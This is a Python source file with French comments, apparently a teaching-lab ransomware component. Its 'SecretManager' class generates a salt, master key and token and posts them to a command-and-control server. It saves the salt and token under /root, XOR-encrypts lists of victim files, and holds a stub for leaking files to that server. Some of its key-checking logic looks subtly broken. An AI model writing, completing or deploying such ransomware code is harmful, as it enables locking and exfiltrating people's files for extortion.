from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests # type: ignore
import base64
import hashlib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

# Clé dérivée à partir d'un sel et d'une clé maître 
    def do_derivation(self, salt: bytes, key: bytes) -> bytes: # La clé et le sel en paramètres 
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return kdf.derive(key) #Les paramètre sels et clé ont été utilisées pour le retour de cette clé maintenant dérivée

# Génération d'un jeton aléatoire
    def create(self) -> Tuple[bytes, bytes, bytes]: # le tuple retouné contient a la fin le sel, la clé maître et le jeton.
       
        self._salt = secrets.token_bytes(self.SALT_LENGTH)
        master_key = secrets.token_bytes(self.KEY_LENGTH)    
        token = secrets.token_bytes(self.TOKEN_LENGTH)        
        return self._salt, master_key, token

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    
# Envoie les éléments  au CNC
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        url = f"http://{self._remote_host_port}/new"  # URL du CNC

        # le payload JSON contenant le sel, la clé et le jeton encodés en base64.
        payload = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        response = requests.post(url, json=payload) # Envoie les données au CNC
        response.raise_for_status()  # Vérifie le succès de la Requête 

    def setup(self) -> None:
        salt, master_key, token = self.create() # Ici on génere le sel le jeton et la cle maitre

        os.makedirs(self._path, exist_ok=True)  # Création du repertoire sauf s'il existe 

        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file: #Le sel est sauvegardé dans salt.bin 
            salt_file.write(salt)

        with open(os.path.join(self._path, "token.bin"), "wb") as token_file: #Le jeton dans token.bin
            token_file.write(token)

        self.post_new(salt, master_key, token) #le sel, la clé et le jeton sont envoyé au CNC.

    def load(self) -> None:
        try:
            # ici salt.bin est ouvert en mode binaire (rb)on lit le contenu puis on le stocke dans le salt
            with open(os.path.join(self._path, "salt.bin"), "rb") as salt_file:
                self._salt = salt_file.read()

            # token.bin stocké dans le token
            with open(os.path.join(self._path, "token.bin"), "rb") as token_file:
                self._token = token_file.read()

        except FileNotFoundError as e:
            raise FileNotFoundError("Fichier de selou jeton introuvable.") from e
        except Exception as e:
            raise Exception(f"Erreur de chargement : {e}")

    def check_key(self, candidate: bytes) -> bool:
        # Vérifie si la longueur de la clé correspond a celle qu'on attend
        return len(candidate) == self.KEY_LENGTH

    def set_key(self, b64_key: str) -> None:
        decoded_key = base64.b64decode(b64_key)

        # On vérifier si la clé est valide
        if not self.check_key(decoded_key):
            raise ValueError("Clé non valide.")

        
        derived_key = self.do_derivation(self._salt, decoded_key)#Ici on vient dériver la clé

        # Comparer la clé dérivée avec la clé d'origine
        if derived_key != self._key:
            raise ValueError("La clé fournie ne correspond pas à la clé d'origine.") # On Compare la clé dérivée avec la clé d'origine

        # Si la clé est valide, la définir
        self._key = decoded_key

    def get_hex_token(self) -> str:
        if self._token is None:
            raise ValueError("token non defini")

        # Hacher le token avec hashlib.sha256 
        token_hash = hashlib.sha256(self._token).hexdigest()
        return token_hash #Sous forme d'hexadecimale

    def xorfiles(self, files: List[str]) -> None: 
        if self._key is None: #Ici on vient lever une exception pour self._key si elle n'est pas définie
            raise ValueError("Clé de chiffrement non définie.")

        for file_path in files:
            try:
                xorfile(file_path, self._key)  # Le chiffrement est effectué ici en appellant xorfile avec le chemin du fichier et la clé
            except Exception as e:
                self._log.error(f"Erreur de chiffrement {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self) -> None: # Ici on suprimme la clé le sel et le jeton
        try:
            # On verifie dabord que chaque fichier existe avant de le supprimer
            salt_file_path = os.path.join(self._path, "salt.bin")
            if os.path.exists(salt_file_path):
                os.remove(salt_file_path)

            token_file_path = os.path.join(self._path, "token.bin")
            if os.path.exists(token_file_path):
                os.remove(token_file_path)

            self._salt = None
            self._key = None
            self._token = None

        except Exception as e:
            raise Exception(f"Erreur de suppression des éléments: {e}")